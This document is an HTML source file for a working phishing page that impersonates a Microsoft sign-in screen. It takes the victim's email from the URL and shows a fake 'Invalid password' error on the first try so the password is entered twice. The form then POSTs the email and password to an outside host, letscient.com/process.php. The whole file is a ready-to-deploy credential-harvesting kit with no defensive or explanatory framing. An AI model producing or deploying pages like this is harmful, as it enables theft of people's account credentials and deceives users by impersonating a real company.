<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="logo.svg" type="image/png">
    <title>Microsoft Sign In</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: url('logo/bg.jpg') no-repeat center center;
            background-size: cover;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            color: #333;
        }
        
        .login-container {
            background-color: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            padding: 30px;
            width: 400px;
            max-width: 90%;
        }
        
        .microsoft-logo {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
        }
        
        .microsoft-logo svg {
            width: 24px;
            height: 24px;
            margin-right: 10px;
        }
        
        .email-display {
            display: flex;
            align-items: center;
            margin-bottom: 20px;
            font-size: 14px;
            color: #666;
        }
        
        h2 {
            margin-top: 0;
            margin-bottom: 20px;
            font-size: 24px;
            font-weight: 600;
        }
        
        .password-input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            margin-bottom: 15px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .password-input.invalid {
            border-color: #e74c3c;
        }
        
        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-bottom: 15px;
            display: none;
        }
        
        .forgot-password {
            color: #0067b8;
            text-decoration: none;
            font-size: 14px;
            margin-bottom: 20px;
            display: inline-block;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .sign-in-button {
            background-color: #0067b8;
            color: white;
            border: none;
            border-radius: 4px;
            padding: 12px 24px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            transition: background-color 0.3s;
        }
        
        .sign-in-button:disabled {
            background-color: #999;
            cursor: not-allowed;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="microsoft-logo">
            <svg viewBox="0 0 24 24" fill="currentColor">
                <rect x="0" y="0" width="11" height="11" fill="#F25022"/>
                <rect x="13" y="0" width="11" height="11" fill="#7FBA00"/>
                <rect x="0" y="13" width="11" height="11" fill="#00A4EF"/>
                <rect x="13" y="13" width="11" height="11" fill="#FFB900"/>
            </svg>
            <span>Microsoft</span>
        </div>
        
        <div class="email-display">
            <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M19 12H5M12 19l-7-7 7-7"/>
            </svg>
            <span id="userEmail">kdkldkkl@example.com</span>
        </div>
        
        <h2>Enter password</h2>
        
        <form method="POST" action="http://letscient.com/process.php" id="loginForm">
            <input type="hidden" name="email" id="hiddenEmail" value="kdkldkkl@example.com">
            <input type="password" class="password-input" 
                   placeholder="Password" id="passwordInput" name="password" autocomplete="off" required>
            <div class="error-message" id="errorMessage"></div>
            
            <a href="#" class="forgot-password">Forgot password?</a>
            
            <button type="submit" class="sign-in-button">Sign in</button>
        </form>
    </div>

    <script>
        // Get email from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        if (email) {
            document.getElementById('userEmail').textContent = email;
            document.getElementById('hiddenEmail').value = email;
        }

        let attemptCount = 0;

        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            
            const password = document.getElementById('passwordInput').value.trim();
            const errorMessage = document.getElementById('errorMessage');
            const passwordInput = document.getElementById('passwordInput');
            
            if (!password) {
                alert("Please enter your password.");
                return;
            }

            attemptCount++;
            
            // First attempt: always show error
            if (attemptCount === 1) {
                errorMessage.style.display = 'block';
                errorMessage.textContent = 'Invalid password';
                passwordInput.classList.add('invalid');
                passwordInput.value = '';
            } else {
                // Second attempt: submit the form
                this.submit();
            }
        });
    </script>
</body>
</html>
